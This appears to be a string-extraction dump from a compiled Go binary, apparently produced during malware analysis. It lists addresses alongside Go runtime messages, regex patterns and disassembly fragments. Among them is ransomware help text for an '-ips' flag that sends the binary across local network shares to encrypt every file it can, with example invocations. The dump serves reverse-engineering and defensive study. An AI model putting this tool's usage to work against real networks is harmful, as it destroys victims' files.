reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x6ab2c6	0x858061	string	0x6aab40	^rgb\(\s*(?:(?:0|[1-9]\d?|1\d\d?|2[0-4]\d|25[0-5])\s*,\s*(?:0|[1-9]\d?|1\d\d?|2[0-4]\d|25[0-5])\s*,\s*(?:0|[1-9]\d?|1\d\d?|2[0-4]\d|25[0-5])|(?:0|[1-9]\d?|1\d\d?|2[0-4]\d|25[0-5])%\s*,\s*(?:0|[1-9]\d?|1\d\d?|2[0-4]\d|25[0-5])%\s*,\s*(?:0|[1-9]\d?|1\d\d?|2[0-4]\d|25[0-5])%)\s*\)$stateTextstateTagstateAttrNamestateAfterNamestateBeforeValuestateHTMLCmtstateRCDATAstateAttrstateURLstateSrcsetstateJSstateJSDqStrstateJSSqStrstateJSRegexpstateJSBlockCmtstateJSLineCmtstateCSSstateCSSDqStrstateCSSSqStrstateCSSDqURLstateCSSSqURLstateCSSURLstateCSSBlockCmtstateCSSLineCmtstateError^rgba\(\s*(?:(?:0|[1-9]\d?|1\d\d?|2[0-4]\d|25[0-5])\s*,\s*(?:0|[1-9]\d?|1\d\d?|2[0-4]\d|25[0-5])\s*,\s*(?:0|[1-9]\d?|1\d\d?|2[0-4]\d|25[0-5])|(?:0|[1-9]\d?|1\d\d?|2[0-4]\d|25[0-5])%\s*,\s*(?:0|[1-9]\d?|1\d\d?|2[0-4]\d|25[0-5])%\s*,\s*(?:0|[1-9]\d?|1\d\d?|2[0-4]\d|25[0-5])%)\s*,\s*(?:(?:0.[1-9]*)|[01])\s*\)$<html>\n\t<body>\n\t<title>Services</title>\n\t{{range .}}\n\t<hr>\n\tService {{.Name}}\n\t<hr>\n\t\t<table>\n\t\t<th align=center>Method</th><th align=center>Calls</th>\n\t\t{{range .Method}}\n\t\t\t<tr>\n\t\t\t<td align=left font=fixed>{{.Name}}({{.Type.ArgType}}, {{.Type.ReplyType}}) error</td>\n\t\t\t<td align=center>{{.Type.NumCalls}}</td>\n\t\t\t</tr>\n\t\t{{end}}\n\t\t</table>\n\t{{end}}\n\t</body>\n\t</html>Flag allow you to provide ip addresses of local shares\nbinary will traverse this shares and encrypt all files which can be encrypted\nFormat requirements:\ndo not use whitespaces when you provide values\ngeneric format: ./binary.exe -ips val1,val2,...,valN\n'val' represents ip address\nall 'val' should be ip addresses. If not - binary will skip it\nif you provide duplicated ip addresses - binary will remove duplicated value\nexample:\n./binary.exe -ips "192.168.1.1,192.168.1.2" (in this case binary parse 192.168.1.1 and 192.168.1.2)\n./binary.exe -ips 192.168.1.1,192.168.1.1 (in this case binary parse 192.168.1.1)\n./binary.exe -ips 192.168.1.1,192.168.1.1,19
0x6ab777	0x84eea2	string	0x6aab40	^[a-zA-Z]([a-zA-Z0-9\-]+[\.]?)*[a-zA-Z0-9]$bufio: tried to rewind past start of buffercannot unread - last byte has not been readedwards25519: invalid point encoding lengthexplicit time type given to non-time membergcBgMarkWorker: unexpected gcMarkWorkerModegrew heap, but no adequate free space foundheapBitsSetTypeGCProg: unexpected bit counthttp2: server closing client connection: %vhttp2: too many 1xx informational responseshttp2: unexpected ALPN protocol %q; want %qinterrupted system call should be restartedmult64bitPow10: power of 10 is out of rangemultiple Read calls return no data or errornet/http: timeout awaiting response headersnon executable command in pipeline stage %dnon in-use span found with specials bit setreflect.Select: RecvDir case has Send valuereflect.Select: default case has Chan valuereflect.Select: default case has Send valuereflect: Call with too many input argumentsreflect: CallSlice of non-variadic functionreflect: nil type passed to Type.Implementsroot level max pages doesn't fit in summaryruntime.SetFinalizer: finalizer already setruntime.SetFinalizer: first argument is nilruntime: casfrom_Gscanstatus bad oldval gp=runtime: heapBitsSetTypeGCProg: total bits runtime: releaseSudog with non-nil gp.paramruntime:stoplockedm: lockedg (atomicstatus=timeout waiting for SETTINGS frames from %vtls: received malformed key_share extensiontransform: inconsistent byte count returnedunfinished escape sequence in JS string: %qunfinished open-coded defers in deferreturnunknown runnable goroutine during bootstrapx509: failed to parse dnsName constraint %q using value obtained using unexported fieldDelete duplicated ip [%s] from provided set!cipher: NewGCM requires 128-bit block ciphercompileCallback: float results not supportedconnection exceeded flow control window sizecrypto/sha256: invalid hash state identifiercrypto/sha512: invalid hash state identifiercrypto/x509: error fetching intermediate: %wencoding alphabet contains newline charactergcmarknewobject called while doing checkmarkhttp2: coul
0x6c16c6	0x901158	string	0x6c1280	true
0x6c16d3	0x901160	string	0x6c1280	false
0x6c5888	0x6c5895	string	0x6c5600	HǄ$x blocks=Basic Latin,Latin Extended-B
0x6c6ad6	0x6c6ae3	string	0x6c67e0	HǄ$P blocks=Basic Latin,Latin Extended-B
0x6cb5dc	0x6cb5e9	string	0x6cb3a0	1҈T$7H blocks=Basic Latin,Cyrillic
0x6d9616	0x6d961f	string	0x6d9220	1\bD$C
0x6db66d	0x6db676	string	0x6dae00	<\au\b
0x71b4ca	0x71b4df	string	0x71b4a0	1҈T$'H blocks=Basic Latin,Cyrillic
0x71b4d4	0x71b4df	string	0x71b4a0	1҈T$'H blocks=Basic Latin,Cyrillic
0x71fe6a	0x71fe7f	string	0x71fe40	1҈T$ blocks=Basic Latin,Cyrillic
0x71fe74	0x71fe7f	string	0x71fe40	1҈T$ blocks=Basic Latin,Cyrillic
0x7247ca	0x7247df	string	0x7247a0	1҈T$ blocks=Basic Latin,Cyrillic
0x7247d4	0x7247df	string	0x7247a0	1҈T$ blocks=Basic Latin,Cyrillic
0x72912a	0x72913f	string	0x729100	1҈T$ blocks=Basic Latin,Cyrillic
0x729134	0x72913f	string	0x729100	1҈T$ blocks=Basic Latin,Cyrillic
0x72d9aa	0x72d9bf	string	0x72d980	1҈T$ blocks=Basic Latin,Cyrillic
0x72d9b4	0x72d9bf	string	0x72d980	1҈T$ blocks=Basic Latin,Cyrillic
0x73230a	0x73231f	string	0x7322e0	1҈T$ blocks=Basic Latin,Cyrillic
0x732314	0x73231f	string	0x7322e0	1҈T$ blocks=Basic Latin,Cyrillic
0x737479	0x7374cd	string	0x7373a0	H9=LzK
0x73e8ec	0x73e90e	string	0x73e760	<\u\vH
0x73e96e	0x73e980	string	0x73e760	< u
0x73e982	0x73e9a4	string	0x73e760	<+t
0x74843a	0x748470	string	0x7483a0	<\at0<\bu
0x7486ba	0x7486f0	string	0x748620	<\at0<\bu
0x749df9	0x901158	string	0x748fa0	true
0x749e59	0x901160	string	0x748fa0	false
0x756579	0x755f67	string	0x755c20	1\tD$L
0x75b4af	0x75b51f	string	0x75b160	HǄ$H blocks=Basic Latin,Latin Extended-B
0x773cdc	0x773cea	string	0x773ba0	H9\b~?H
0x7745cc	0x7745da	string	0x7744a0	H9\b~?H
0x77a279	0x77a285	string	0x779de0	HǄ$ blocks=Basic Latin,Latin Extended-B
